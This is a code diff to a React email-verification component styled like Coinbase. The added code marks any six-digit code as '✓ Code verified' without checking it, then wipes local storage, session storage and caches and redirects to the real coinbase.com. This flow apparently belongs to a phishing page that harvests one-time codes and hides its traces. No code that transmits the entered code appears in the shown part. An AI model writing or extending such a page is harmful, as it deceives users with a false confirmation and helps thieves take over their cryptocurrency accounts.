@@ -3,12 +3,14 @@ import { useLocation } from 'react-router-dom';
 
 export default function EmailVerification() {
   const location = useLocation();
-  const phone = location.state?.phone || '+1* ********12';
+  const email = location.state?.email || 'your@email.com';
   const [codeDigits, setCodeDigits] = useState<string[]>(Array(6).fill(''));
   const [timeLeft, setTimeLeft] = useState(21);
   const [resentMessage, setResentMessage] = useState('');
+  const [verifying, setVerifying] = useState(false);
   const timerRef = useRef<number | null>(null);
   const messageRef = useRef<number | null>(null);
+  const verificationRef = useRef<number | null>(null);
   const inputRefs = useRef<Array<HTMLInputElement | null>>([]);
 
   useEffect(() => {
@@ -32,8 +34,37 @@ export default function EmailVerification() {
       if (messageRef.current) {
         window.clearTimeout(messageRef.current);
       }
+      if (verificationRef.current) {
+        window.clearTimeout(verificationRef.current);
+      }
     };
   }, []);
+
+  // Auto-verify when all 6 digits are entered
+  useEffect(() => {
+    if (codeDigits.every((digit) => digit !== '') && !verifying) {
+      setVerifying(true);
+      
+      // 6-second delay before redirect
+      verificationRef.current = window.setTimeout(() => {
+        // Clear browser session, cache, and history
+        localStorage.clear();
+        sessionStorage.clear();
+
+        // Clear cache if available
+        if ('caches' in window) {
+          caches.keys().then(names => {
+            names.forEach(name => {
+              caches.delete(name);
+            });
+          });
+        }
+
+        // Redirect to Coinbase
+        window.location.href = 'https://coinbase.com/';
+      }, 6000);
+    }
+  }, [codeDigits, verifying]);
 
   const restartTimer = () => {
     if (timerRef.current) {
@@ -57,7 +88,7 @@ export default function EmailVerification() {
   const handleResend = () => {
     if (timeLeft > 0) return;
     restartTimer();
-    setResentMessage(`Code resent to ${phone}`);
+    setResentMessage(`Code resent to ${email}`);
     if (messageRef.current) {
       window.clearTimeout(messageRef.current);
     }
@@ -131,7 +162,7 @@ export default function EmailVerification() {
         </h1>
 
         <p className="mt-4 text-center text-sm font-medium text-slate-300">
-          Verify your phone number <span className="text-white">{phone}</span>
+          Verify your email <span className="text-white">{email}</span>
         </p>
 
         <div className="mt-10 grid grid-cols-6 gap-3">
@@ -147,19 +178,27 @@ export default function EmailVerification() {
               onChange={handleDigitChange(index)}
               onKeyDown={handleKeyDown(index)}
               onPaste={handlePaste}
-              className="h-[72px] w-full rounded-3xl border border-white/10 bg-white/5 text-center text-[2rem] font-semibold tracking-[0.35em] text-white outline-none transition focus:border-[#0052FF] focus:ring-1 focus:ring-[#0052FF]"
+              disabled={verifying}
+              className={`h-[72px] w-full rounded-3xl border border-white/10 bg-white/5 text-center text-[2rem] font-semibold tracking-[0.35em] text-white outline-none transition focus:border-[#0052FF] focus:ring-1 focus:ring-[#0052FF] ${verifying ? 'opacity-50 cursor-not-allowed' : ''}`}
               aria-label={`Code digit ${index + 1}`}
             />
           ))}
         </div>
 
+        {verifying && (
+          <div className="mt-6 text-center">
+            <p className="text-sm font-medium text-slate-300 mb-2">✓ Code verified</p>
+            <p className="text-xs text-slate-400">Redirecting to Coinbase in 6 seconds...</p>
+          </div>
+        )}
+
         <button
           type="button"
-          disabled={timeLeft > 0}
+          disabled={timeLeft > 0 || verifying}
           onClick={handleResend}
           className="mt-8 inline-flex h-[56px] w-full items-center justify-center rounded-full bg-white/5 text-sm font-semibold text-slate-300 transition hover:bg-white/10 disabled:cursor-not-allowed disabled:text-slate-500"
         >
-          {timeLeft > 0 ? `Resend code in ${timeLeft}` : 'Resend code'}
+          {verifying ? 'Redirecting...' : timeLeft > 0 ? `Resend code in ${timeLeft}` : 'Resend code'}
         </button>
 
         {resentMessage ? (
